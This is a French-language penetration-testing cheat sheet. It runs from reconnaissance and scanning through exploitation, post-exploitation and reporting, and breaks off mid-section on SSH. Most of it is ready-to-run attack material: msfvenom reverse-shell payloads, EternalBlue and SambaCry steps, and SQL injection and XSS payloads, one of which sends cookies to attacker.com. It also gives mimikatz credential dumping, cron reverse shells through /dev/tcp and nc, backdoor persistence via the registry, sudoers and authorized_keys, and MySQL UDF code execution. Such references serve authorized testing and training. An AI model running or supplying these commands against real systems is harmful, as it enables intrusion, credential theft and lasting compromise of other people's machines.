# CHEATSHEET PENTEST PROFESSIONNELLE

## 📌 TABLE DES MATIÈRES
1. [Reconnaissance](#reconnaissance)
2. [Scanning & Énumération](#scanning--énumération)
3. [Exploitation](#exploitation)
4. [Post-Exploitation](#post-exploitation)
5. [Reporting](#reporting)
6. [Standards & Méthodologies](#standards--méthodologies)
7. [Outils Spécialisés](#outils-spécialisés)
8. [Payloads & Reverse Shells](#payloads--reverse-shells)
9. [Wordlists, Exegol & Ressources](#wordlists--exegol)
10. [Classification des Vulnérabilités](#classification-des-vulnérabilités)

---

## RECONNAISSANCE

### 🔍 NMAP POUR RECONNAISSANCE
```bash
# Phase de reconnaissance - Découverte passive/légère
nmap -sn 192.168.1.0/24                   # Ping scan (sans scan de port)
nmap -PR 10.0.0.0/24                      # ARP scan uniquement (réseau local)
nmap -sn -PE 172.16.0.0/16                # ICMP Echo scan
nmap -sL 192.168.1.0/24                   # Liste les hôtes sans les scanner
nmap -sn --disable-arp-ping 10.0.0.0/24   # Sans ARP, uniquement TCP/ICMP
nmap --packet-trace -sn 192.168.1.1       # Affiche les paquets pour analyse
```


### 🌐 DNS & DOMAINES
```bash
# DNS classique
dig +short A example.com                  # Enregistrements A
dig +short MX example.com                 # Serveurs mail
dig +short NS example.com                 # Name servers
dig +short AXFR @ns1.example.com example.com # Transfert de zone

# DNSRecon
dnsrecon -d example.com -D /path/to/subdomains.txt -t brt # Bruteforce sous-domaines
dnsrecon -d example.com -a                # Tous les enregistrements

# Sublist3r
sublist3r -d example.com -e google,yahoo  # Recherche sous-domaines

# Amass
amass enum -d example.com                 # Énumération passive
amass enum -d example.com -active         # Énumération active
```

### 🔎 OSINT
```bash
# theHarvester
theHarvester -d example.com -b google,linkedin,twitter # Recherche emails/sous-domaines
theHarvester -d example.com -l 500 -b all # Tous les moteurs, 500 résultats

# Maltego (graphique)
# Importer domaine → Transforms → DNS → + 

# Shodan CLI
shodan search org:"Target Company"         # Recherche par organisation
shodan host 8.8.8.8                        # Info sur une IP

# WHOIS
whois example.com                          # Info d'enregistrement domaine
```

### 🔧 VHOSTS & WEB
```bash
# Gobuster - Sous-domaines
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Wfuzz - Virtual hosts
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" -u http://example.com

# WayBackMachine
waybackurls example.com                    # URLs historiques
```

---

## SCANNING & ÉNUMÉRATION

### 🔍 NMAP POUR SCANNING
```bash
# Scan basique
nmap -sS -T4 192.168.1.100                # Scan SYN rapide
nmap -sT -p 80,443,8080 10.0.0.10         # Scan TCP connect sur ports web

# Scan complet avec énumération
nmap -sS -sV -sC -O -p- 192.168.1.100     # Scan SYN complet + versions + scripts + OS
nmap -sV --version-intensity 9 10.0.0.10  # Détection versions agressive
nmap -sU -sV --top-ports 200 10.0.0.1     # Top 200 ports UDP + versions
nmap -A 192.168.1.100                     # Scan agressif (-sS -sV -sC -O --traceroute)

# Scans ciblés et avancés
nmap -sV --script=vuln 192.168.1.100      # Recherche de vulnérabilités
nmap -sV --script=smb* 192.168.1.100      # Tous les scripts SMB
nmap -sV --script=http-enum 10.0.0.10     # Énumération HTTP
nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.0/24 # EternalBlue

# Options d'évasion et performance
nmap -f                                   # Fragmentation des paquets
nmap -D RND:5                             # Utiliser 5 leurres aléatoires
nmap --spoof-mac 00:11:22:33:44:55        # Usurpation MAC
nmap -sS -Pn -n --disable-arp-ping        # Sans DNS, sans ping, sans ARP
nmap -p- --min-rate 1000 --max-retries 1  # Scan rapide tous ports
```

### 🌐 WEB
```bash
# Gobuster - Directories
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
gobuster dir -u http://target -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 -b 403,404

# Nikto
nikto -h http://target                     # Scan basique
nikto -h http://target -Tuning 123         # Scan personnalisé (SQL,XSS,CSRF)

# Dirsearch
dirsearch -u http://target -e php,asp,aspx,jsp,html,zip,jar # Extensions multiples
dirsearch -u http://target -w /path/to/wordlist.txt -t 20   # Wordlist personnalisée

# WPScan (WordPress)
wpscan --url http://target --enumerate u,vp # Énumération users et plugins vuln
wpscan --url http://target --enumerate all  # Énumération complète
```

### 💻 SMB/WINDOWS
```bash
# Énumération SMB
smbclient -L //192.168.1.100               # Liste des partages
smbclient \\\\192.168.1.100\\share -U user # Connexion à un partage
smbmap -H 192.168.1.100                    # Permissions des partages
smbmap -H 192.168.1.100 -U anonymous -P "" # Connexion anonyme

# Enum4linux
enum4linux -a 192.168.1.100                # Énumération complète
enum4linux -U 192.168.1.100                # Utilisateurs uniquement
enum4linux -S 192.168.1.100                # Partages uniquement

# CrackMapExec
crackmapexec smb 192.168.1.0/24            # Découverte SMB
crackmapexec smb 192.168.1.0/24 -u user -p pass # Test creds

# LDAP
ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=local" # Dump LDAP anonyme
```

### 🐧 LINUX/UNIX
```bash
# Services réseau
showmount -e 192.168.1.100                 # Partages NFS
rpcinfo -p 192.168.1.100                   # Services RPC

# NFS
mount -t nfs 192.168.1.100:/share /mnt/nfs # Monter partage NFS

# Finger
finger @192.168.1.100                      # Utilisateurs actifs
```

### 📱 SERVICES SPÉCIFIQUES
```bash
# SSH
ssh-audit 192.168.1.100                    # Audit config SSH

# SMTP
smtp-user-enum -M VRFY -U /path/to/users.txt -t 192.168.1.100 # Énumération utilisateurs

# SNMP
snmpwalk -v2c -c public 192.168.1.100      # Walk SNMP avec community string
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.100 # Bruteforce community

# FTP
nmap --script=ftp-* -p 21 192.168.1.100    # Scripts FTP Nmap
```

---

## EXPLOITATION

### 🛠 METASPLOIT
```bash
# Base
msfconsole                                 # Lancer Metasploit
search type:exploit platform:windows       # Chercher exploits Windows
search cve:2021                            # Exploits par CVE

# Configuration exploits courants
# SMB EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.200
exploit

# WebShell
use exploit/multi/script/web_delivery
set TARGET 1 # PHP
set LHOST 192.168.1.200
set LPORT 4444
exploit

# Brute-force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE false
run
```

### 🧪 MSFVENOM
```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe -e x64/shikata_ga_nai -i 3 > encoded_shell.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f elf > shell.elf

# Web
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw > shell.jsp

# Multi-plateformes
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw > shell.py
```

### 💉 INJECTIONS SQL
```bash
# Tests de base
' OR 1=1 --
" OR 1=1 --
admin' --
' UNION SELECT 1,2,3 --

# Détection nombre colonnes
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY n -- # Jusqu'à erreur

# UNION Attacks
' UNION SELECT 1,2,3 FROM information_schema.tables --
' UNION SELECT table_name,column_name,1 FROM information_schema.columns --
' UNION SELECT username,password,1 FROM users --

# SQLMap
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D database_name --tables
sqlmap -u "http://target/page.php?id=1" -D database_name -T users --columns
sqlmap -u "http://target/page.php?id=1" -D database_name -T users -C username,password --dump
sqlmap -u "http://target/login.php" --data="username=admin&password=pass" --method POST --dbs
```

### 🔓 CRACKING & BRUTEFORCE
```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
hydra -L users.txt -P pass.txt 192.168.1.100 ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 mysql

# John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt # Windows NTLM

# Hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt # MD5
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt # NTLM
```

### 🔧 OUTILS SPÉCIFIQUES
```bash
# XXE
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

# XSS
<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>

# CSRF
<img src="http://bank.com/transfer?to=attacker&amount=1000">

# LFI/RFI
http://target/page.php?file=../../../etc/passwd
http://target/page.php?file=http://attacker.com/malicious.php
```

---

## POST-EXPLOITATION

### 🔍 ÉNUMÉRATION SYSTÈME
```bash
# Windows
systeminfo                                 # Infos système
net user                                   # Liste des utilisateurs
netstat -ano                               # Connexions actives
tasklist /svc                              # Processus et services
wmic qfe get Caption,Description           # Patches de sécurité
wmic product get name,version              # Logiciels installés
dir C:\Users\username\Documents /s /b      # Recherche récursive

# Linux
uname -a                                   # Version kernel
cat /etc/passwd                            # Utilisateurs
netstat -tulpn                             # Ports ouverts
ps aux                                     # Processus actifs
find / -perm -u=s -type f 2>/dev/null      # Binaires SUID
cat /etc/crontab                           # Tâches planifiées
history                                    # Historique commandes
```

### 🚀 ÉLÉVATION PRIVILÈGES
```bash
# Windows
whoami /priv                               # Privilèges actuels
SharpUp.exe audit                          # Vulnérabilités élévation privs
winPEAS.exe                                # Scan auto vulnérabilités
PowerUp.ps1                                # PS1 recherche élévation
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Installers élevés

# Linux
# Commandes sudo sans pass détaillé
sudo -l                                    # Liste les commandes exécutables avec sudo
sudo -l -U username                        # Liste pour un utilisateur spécifique

# Interprétation des résultats sudo -l
# (root) ALL=(ALL:ALL) ALL                 # Tous droits sur toutes commandes
# (root) NOPASSWD: /usr/bin/find           # Exécuter find sans mot de passe
# (root) NOPASSWD: /usr/bin/vim /etc/      # Exécuter vim uniquement sur /etc/
# (root) NOPASSWD: !/usr/bin/vim /etc/sudoers # Tout sauf modifier sudoers
# %sudo ALL=(ALL:ALL) ALL                  # Groupe sudo peut tout faire

# Exploitation sudo -l
# Si /bin/cp est permis
sudo cp /dev/null /etc/shadow              # Effacer le fichier shadow
sudo cp /tmp/evil_shadow /etc/shadow       # Remplacer shadow

# Si /usr/bin/vim est permis
sudo vim -c "!sh"                          # Ouvrir shell depuis vim
sudo vim /etc/shadow                       # Éditer shadow pour reset passwords

# Si /usr/bin/python est permis
sudo python -c "import os; os.system('/bin/bash')" # Spawn shell

./linpeas.sh                               # Scan vulnérabilités Linux
find / -perm -u=s -type f 2>/dev/null      # Binaires SUID
lse.sh -l 1 -i                             # Linux Smart Enumeration
cat /etc/sudoers                           # Fichier sudoers
```

### 🔐 VOL CREDENTIALS
```bash
# Windows
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords                   # Mots de passe en mémoire
sekurlsa::tickets                          # Tickets Kerberos
lsadump::sam                               # Hachés SAM
lsadump::dcsync /domain:corp.local /user:Administrator # DCSync

# Linux
cat /etc/shadow                            # Hachés utilisateurs
find / -name ".bash_history" -exec cat {} \; 2>/dev/null # Historique bash
cat ~/.ssh/id_rsa                          # Clé SSH privée
grep -ri password /var/www/                # Recherche mots de passe
```

### 🔗 PERSISTANCE
```bash
# Windows
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\windows\temp\backdoor.exe" # Registre run key
schtasks /create /sc minute /mo 1 /tn "Backdoor" /tr C:\windows\temp\backdoor.exe # Tâche planifiée
wmic /node:localhost /namespace:\\root\subscription path __EventFilter CREATE Name="filtP2", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" # WMI

# Linux
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.200/4444 0>&1'" >> /etc/crontab # Crontab
echo "*/5 * * * * root nc 192.168.1.200 4444 -e /bin/bash" > /etc/cron.d/backdoor # Cron.d
echo "backdoor ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers # Sudo sans pass
echo "ssh-rsa AAAAB3NzaC1..." >> ~/.ssh/authorized_keys # Clé SSH
```

### 🧠 MOUVEMENT LATÉRAL
```bash
# Windows
pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.101 cmd.exe # Pass-the-Hash

# Impacket
impacket-wmiexec DOMAIN/user:password@192.168.1.101
impacket-psexec DOMAIN/user:password@192.168.1.101
impacket-smbexec DOMAIN/user:password@192.168.1.101

# Linux
ssh-keygen -t rsa -b 4096                  # Générer clé SSH
cat id_rsa.pub >> /home/victim/.ssh/authorized_keys # Ajouter clé SSH
ssh -i id_rsa victim@192.168.1.101         # Se connecter
```

---

## REPORTING

### 📝 STRUCTURE RAPPORT
```
1. Résumé exécutif
   • Principales conclusions
   • Tableau des vulnérabilités
   • Recommandations prioritaires

2. Méthodologie
   • Approche
   • Outils utilisés
   • Limitations

3. Découvertes détaillées
   • Vulnérabilité X
     - Description
     - Preuve d'exploitation
     - Impact
     - Recommandation
   • Répéter pour chaque vulnérabilité

4. Conclusion
   • Résumé des risques
   • Plan d'action proposé

5. Annexes
   • Résultats détaillés des scans
   • Logs
   • Preuves techniques
```

### 🎯 SCORING CVSS
```
# Format CVSS v3.1
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  # Score 9.8 (Critical)

# Vecteurs
AV - Attack Vector: N(etwork), A(djacent), L(ocal), P(hysical)
AC - Attack Complexity: L(ow), H(igh)
PR - Privileges Required: N(one), L(ow), H(igh)
UI - User Interaction: N(one), R(equired)
S - Scope: U(nchanged), C(hanged)
C - Confidentiality: N(one), L(ow), H(igh)
I - Integrity: N(one), L(ow), H(igh)
A - Availability: N(one), L(ow), H(igh)
```

### 🔢 OUTILS DE SCORING & REPORTING
```bash
# Calculateurs CVSS
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator     # Calculateur officiel NIST
https://www.first.org/cvss/calculator/3.1                # Calculateur FIRST
https://www.rapid7.com/products/metasploit/vulnerability-scoring/ # Rapid7

# Frameworks de reporting
Dradis CE                                  # Framework open-source pour rapport
faraday                                    # Plateforme de reporting collaborative
pwndoc                                     # Outil de documentation pentest

# Intégration avec outils 
searchsploit -x --nmap scan.xml            # Convertir scan Nmap en recherche exploits
metasploit db_import scan.xml              # Importer scan dans MSF

# Templates de rapport
https://github.com/juliocesarfort/public-pentesting-reports # Exemples de rapports
https://github.com/tjnull/OSCP-Stuff/blob/master/reporting/ # Templates OSCP
```

### 📋 STANDARDS & MÉTHODOLOGIES
```
# OWASP Top 10 (2021)
A01 - Broken Access Control
A02 - Cryptographic Failures
A03 - Injection
A04 - Insecure Design
A05 - Security Misconfiguration
A06 - Vulnerable and Outdated Components
A07 - Identification and Authentication Failures
A08 - Software and Data Integrity Failures
A09 - Security Logging and Monitoring Failures
A10 - Server-Side Request Forgery

# PTES (Penetration Testing Execution Standard)
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

# OSSTMM (Open Source Security Testing Methodology Manual)
# NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment)
# WSTG (Web Security Testing Guide)
```

### 📊 NIVEAUX DE RISQUE
```
Critique (9.0-10.0) : Exploitation facile, impact massif
Élevé (7.0-8.9) : Vulnérabilités exploitables avec impact important
Moyen (4.0-6.9) : Exploitation contrainte ou impact limité
Faible (0.1-3.9) : Difficile à exploiter, impact minime
Informatif (0.0) : Pas d'impact direct sur la sécurité
```

---

## OUTILS SPÉCIALISÉS

### 🔬 EXPLOITATION SAMBA DÉTAILLÉE
```bash
# 1. ÉNUMÉRATION SAMBA
# Détection basique
nmap -p 139,445 192.168.1.0/24            # Découvrir les serveurs Samba
nmap -p 139,445 --script=smb-protocols 192.168.1.100 # Versions protocoles
nmap -p 139,445 --script=smb-security-mode 192.168.1.100 # Mode sécurité
nmap -p 139,445 --script=smb-enum-shares 192.168.1.100 # Énumération partages

# Énumération des partages
smbclient -L //192.168.1.100 -N           # Liste partages (anonyme)
smbclient -L //192.168.1.100 -U user%pass # Liste partages (authentifié)
smbmap -H 192.168.1.100                   # Permissions des partages
smbmap -H 192.168.1.100 -u admin -p password -d WORKGROUP # Auth avec domaine

# Exploration approfondie
enum4linux -a 192.168.1.100               # Énumération complète
enum4linux -u user -p pass -a 192.168.1.100 # Avec credentials
enum4linux -S 192.168.1.100               # Partages uniquement
enum4linux -U 192.168.1.100               # Utilisateurs uniquement
enum4linux -P 192.168.1.100               # Politique de mot de passe

# Connexion et exploration
smbclient //192.168.1.100/share -N        # Connexion anonyme
smbclient //192.168.1.100/share -U user%pass # Connexion authentifiée
smb: \> ls                                # Lister contenu
smb: \> get file.txt                      # Télécharger fichier
smb: \> put file.txt                      # Uploader fichier
smb: \> mask ""                           # Afficher fichiers cachés

# 2. VULNÉRABILITÉS ET EXPLOITS COURANTS
# Détection de vulnérabilités
nmap -p 445 --script=smb-vuln* 192.168.1.100 # Toutes vulnérabilités
nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.100 # EternalBlue
nmap -p 445 --script=smb-vuln-ms08-067 192.168.1.100 # Conficker
nmap -p 445 --script=smb-double-pulsar-backdoor 192.168.1.100 # DoublePulsar

# EternalBlue (MS17-010) - Metasploit
msfconsole
use auxiliary/scanner/smb/smb_ms17_010    # Vérification vulnérabilité
set RHOSTS 192.168.1.100
run
use exploit/windows/smb/ms17_010_eternalblue # Exploit
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
exploit

# EternalBlue (MS17-010) - Manuel
git clone https://github.com/worawit/MS17-010.git
cd MS17-010
pip install impacket
# 1. Générer shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o shellcode.bin
# 2. Lancer listener
nc -lvnp 4444
# 3. Exécuter exploit
python3 send_and_execute.py 192.168.1.100 shellcode.bin

# SambaCry (CVE-2017-7494) - Metasploit
use exploit/linux/samba/is_known_pipename
set RHOST 192.168.1.100
set SMB_SHARE_NAME shared
set SMB_FOLDER path/in/share
exploit

# NullSessionRCE (SMB1) - Énumération via null session
smbclient -L //192.168.1.100 -N
rpcclient -U "" -N 192.168.1.100
rpcclient $> enumdomusers              # Énumération utilisateurs domaine
rpcclient $> queryuser 0x3e8           # Info utilisateur spécifique
rpcclient $> enumprinters              # Énumération imprimantes

# 3. AUTRES TECHNIQUES SMB
# Relais SMB (attaque MITM)
impacket-ntlmrelayx -tf targets.txt -smb2support # Relais NTLM
responder -I eth0 -rwfv                  # Interception LLMNR/NBT-NS

# PsExec pour exécution distante
impacket-psexec domain/user:password@192.168.1.100
impacket-psexec -hashes LMHASH:NTHASH domain/user@192.168.1.100

# SMB avec IPv6
nmap -6 -p 445 fe80::1%eth0               # Scan SMB sur IPv6

# Coercition SMB
impacket-PetitPotam -d domain -u user -p password 192.168.1.200 192.168.1.100

# 4. POST-EXPLOITATION
# Monter partage pour persistance
mkdir /mnt/smb
mount -t cifs -o username=user,password=pass //192.168.1.100/share /mnt/smb

# Créer un partage SMB pour exfiltration
impacket-smbserver share /tmp/exfil
# Sur victime Windows:
copy C:\sensitive.txt \\192.168.1.200\share\

# Recherche de fichiers sensibles
smbmap -H 192.168.1.100 -u user -p pass -R # Recherche récursive
smbmap -H 192.168.1.100 -u user -p pass -A "*.txt" # Chercher tous .txt

# 5. CHECKLIST SAMBA PENTEST
# [ ] Vérifier version Samba (nmap --script=smb-os-discovery)
# [ ] Tester connexion anonyme (smbclient -L // -N)
# [ ] Énumérer partages et permissions
# [ ] Tester vulnérabilité EternalBlue (MS17-010)
# [ ] Vérifier SambaCry (CVE-2017-7494) si Linux
# [ ] Tester null sessions et NTLM relay
# [ ] Vérifier vulnérabilités SMB printer (MS10-061)
# [ ] Tester authentification brute-force
```

### 📂 EXPLOITATION FTP DÉTAILLÉE
```bash
# 1. ÉNUMÉRATION FTP
# Détection et version
nmap -p 21 192.168.1.0/24                 # Découvrir serveurs FTP
nmap -p 21 --script=ftp-anon 192.168.1.100 # Tester accès anonyme
nmap -sV -p 21 192.168.1.100              # Version du service
nmap -p 21 --script=ftp-* 192.168.1.100   # Tous les scripts FTP

# Connexion manuelle
ftp 192.168.1.100
Username: anonymous                       # Tester anonyme
Password: anonymous@domain.com

# Commandes FTP basiques
ftp> ls -la                               # Lister fichiers (cachés inclus)
ftp> cd /                                 # Aller à la racine
ftp> get file.txt                         # Télécharger fichier
ftp> mget *.txt                           # Télécharger plusieurs fichiers
ftp> put backdoor.php                     # Uploader fichier
ftp> binary                               # Mode binaire
ftp> ascii                                # Mode ASCII

# Automatisation FTP
wget -m --no-passive ftp://anonymous:anonymous@192.168.1.100/ # Télécharger tout
hydra -L users.txt -P passes.txt ftp://192.168.1.100 # Bruteforce

# 2. VULNÉRABILITÉS FTP COURANTES
# FTP anonyme
ftp 192.168.1.100
Username: anonymous
Password: anonymous@domain.com
# Vérifier les droits d'accès et fichiers disponibles

# FTP avec TLS - Test SSL/TLS
nmap --script=ssl-enum-ciphers -p 21 192.168.1.100
openssl s_client -connect 192.168.1.100:21 -starttls ftp

# Ancienne version FTP (VSFTPD 2.3.4 backdoor)
nmap --script=ftp-vsftpd-backdoor -p 21 192.168.1.100
# Exploitation via Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit

# ProFTPD 1.3.5 Mod_Copy
nmap -sV -p 21 --script=ftp-proftpd-backdoor 192.168.1.100
# Exploitation manuelle
telnet 192.168.1.100 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Accéder ensuite à http://192.168.1.100/passwd.txt

# 3. TECHNIQUES AVANCÉES FTP
# Énumération utilisateurs (User enumeration)
hydra -L users.txt -p anything 192.168.1.100 ftp -t 4

# Mode passif vs actif
ftp -p 192.168.1.100                     # Mode passif forcé
# Dans la session FTP
ftp> passive                             # Basculer mode passif/actif

# Bypass restrictions avec caractères spéciaux
ftp> ls ../                              # Sortir du répertoire courant
ftp> ls ~root/                           # Accéder au home de root
ftp> ls /etc/                            # Accéder à des chemins absolus

# 4. POST-EXPLOITATION FTP
# Vérification de configuration 
cat /etc/vsftpd.conf                      # Config VSFTPD
cat /etc/proftpd/proftpd.conf             # Config ProFTPD
cat /etc/ftpusers                         # Utilisateurs interdits

# Création d'utilisateur FTP pour persistance
useradd -m ftpuser
passwd ftpuser
echo "ftpuser" >> /etc/vsftpd.users

# 5. CHECKLIST FTP PENTEST
# [ ] Vérifier la version du serveur FTP
# [ ] Tester connexion anonyme
# [ ] Tester bruteforce sur utilisateurs connus
# [ ] Vérifier les droits d'écriture dans des dossiers sensibles
# [ ] Tester les vulnérabilités spécifiques à la version
# [ ] Vérifier possibilité de path traversal
# [ ] Analyser les fichiers de configuration téléchargés
```

### 💼 EXPLOITATION MYSQL DÉTAILLÉE
```bash
# 1. ÉNUMÉRATION MYSQL
# Détection et version
nmap -p 3306 192.168.1.0/24               # Découvrir serveurs MySQL
nmap -p 3306 --script=mysql-info 192.168.1.100 # Informations de base
nmap -p 3306 --script=mysql-enum 192.168.1.100 # Énumération plus complète
nmap -p 3306 --script=mysql-empty-password 192.168.1.100 # Test mdp vides

# Connexion manuelle
mysql -h 192.168.1.100 -u root -p          # Connexion MySQL
mysql -h 192.168.1.100 -u root             # Sans mot de passe

# Commandes MySQL basiques
mysql> SHOW DATABASES;                     # Lister bases de données
mysql> USE database_name;                  # Sélectionner DB
mysql> SHOW TABLES;                        # Lister tables
mysql> SELECT * FROM table_name;           # Voir contenu table
mysql> SELECT user,host,password FROM mysql.user; # Voir utilisateurs/hachés
mysql> SELECT @@version;                   # Version MySQL
mysql> SELECT @@datadir;                   # Répertoire des données

# Bruteforce
hydra -L users.txt -P passes.txt 192.168.1.100 mysql

# 2. VULNÉRABILITÉS MYSQL COURANTES
# Authentification sans mot de passe
mysql -h 192.168.1.100 -u root

# UDF User Defined Function pour exécution de code
# Dans MySQL:
mysql> use mysql;
mysql> create table hack(line blob);
mysql> insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));
mysql> select * from hack into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('bash -i >& /dev/tcp/192.168.1.200/4444 0>&1');

# Injection SQL à distance
sqlmap -u "http://192.168.1.100/index.php?id=1" --dbs # Enumération DB
sqlmap -u "http://192.168.1.100/index.php?id=1" -D mysql --tables # Tables
sqlmap -u "http://192.168.1.100/index.php?id=1" --os-shell # Shell OS

# 3. POST-EXPLOITATION MYSQL
# Obtenir privilèges système (Windows)
mysql -h 192.168.1.100 -u root -p
mysql> SELECT @@plugin_dir;
mysql> USE mysql;
mysql> CREATE TABLE npn(line blob);
mysql> INSERT INTO npn values(load_file('C:/temp/evil.dll'));
mysql> SELECT * FROM npn INTO DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/evil.dll';
mysql> CREATE FUNCTION evil_func RETURNS INT SONAME 'evil.dll';
mysql> SELECT evil_func();

# Accès aux fichiers système
mysql> SELECT load_file('/etc/passwd');
mysql> SELECT load_file('C:/Windows/repair/sam');
mysql> SELECT load_file('/var/www/html/config.php');

# 4. CHECKLIST MYSQL PENTEST
# [ ] Vérifier la version MySQL
# [ ] Tester l'authentification sans mot de passe
# [ ] Bruteforce utilisateurs communs
# [ ] Vérifier les privilèges des utilisateurs
# [ ] Tester l'accès aux fichiers sensibles
# [ ] Tenter l'exécution de code via UDF
# [ ] Vérifier vulnérabilités spécifiques à la version
```

### 📧 EXPLOITATION SMTP/POP3/IMAP DÉTAILLÉE
```bash
# 1. ÉNUMÉRATION SMTP
# Détection et version
nmap -p 25,465,587 192.168.1.0/24         # Découvrir serveurs SMTP
nmap -p 25 --script=smtp-commands 192.168.1.100 # Commandes disponibles
nmap -p 25 --script=smtp-enum-users 192.168.1.100 # Énumération utilisateurs
nmap -p 25 --script=smtp-open-relay 192.168.1.100 # Test relais ouvert

# Commandes manuelles SMTP
telnet 192.168.1.100 25
EHLO test.com
VRFY root                                 # Vérifier si utilisateur existe
EXPN admin                                # Expand alias
RCPT TO: victim@target.com                # Destinataire
MAIL FROM: attacker@evil.com              # Expéditeur

# Énumération utilisateurs
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.100

# 2. ÉNUMÉRATION POP3/IMAP
# Détection
nmap -p 110,995,143,993 192.168.1.0/24    # Découvrir serveurs POP3/IMAP
nmap -p 110 --script=pop3-capabilities 192.168.1.100 # Caps POP3
nmap -p 143 --script=imap-capabilities 192.168.1.100 # Caps IMAP

# Commandes manuelles POP3
telnet 192.168.1.100 110
USER username
PASS password
LIST                                      # Lister tous les messages
RETR 1                                    # Récupérer message #1
QUIT

# Commandes manuelles IMAP
telnet 192.168.1.100 143
a LOGIN username password
a LIST "" *                               # Lister les dossiers
a SELECT INBOX                            # Sélectionner boîte
a FETCH 1 BODY[]                          # Récupérer le message
a LOGOUT

# 3. VULNÉRABILITÉS MAIL COURANTES
# SMTP Relay ouvert (spamming)
telnet 192.168.1.100 25
EHLO test.com
MAIL FROM: attacker@evil.com
RCPT TO: victim@external.com
DATA
Subject: Test relay

Ce serveur est mal configuré.
.

# Bruteforce
hydra -L users.txt -P passwords.txt 192.168.1.100 pop3
hydra -L users.txt -P passwords.txt 192.168.1.100 imap

# Downgrade attaque SSL/TLS
nmap --script=ssl-enum-ciphers -p 110,143,993,995 192.168.1.100
sslscan 192.168.1.100:993

# 4. CHECKLIST MAIL PENTEST
# [ ] Vérifier versions et configurations SMTP/POP3/IMAP
# [ ] Tester énumération utilisateurs via VRFY/EXPN
# [ ] Tester relais SMTP ouvert
# [ ] Bruteforce comptes mail connus
# [ ] Vérifier authentification en clair vs SSL/TLS
# [ ] Tester downgrade attaques
# [ ] Vérifier extraction d'emails sensibles
```

### 🌐 EXPLOITATION SSH DÉTAILLÉE
```bash
# 1. ÉNUMÉRATION SSH
# Détection et version
nmap -p 22 192.168.1.0/24                 # Découvrir serveurs SSH
nmap -p 22 --script=ssh-hostkey 192.168.1.100 # Récupérer clés host
nmap -p 22 --script=ssh2-enum-algos 192.168.1.100 # Algorithmes supportés
nmap -p 22 --script=ssh-auth-methods 192.168.1.100 # Méthodes auth

# Scan approfondi
ssh-audit 192.168.1.100                   # Audit complet configuration
ssh-keyscan 192.168.1.100                 # Récupérer clés publiques

# 2. VULNÉRABILITÉS SSH COURANTES
# Bruteforce
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# Clés SSH faibles
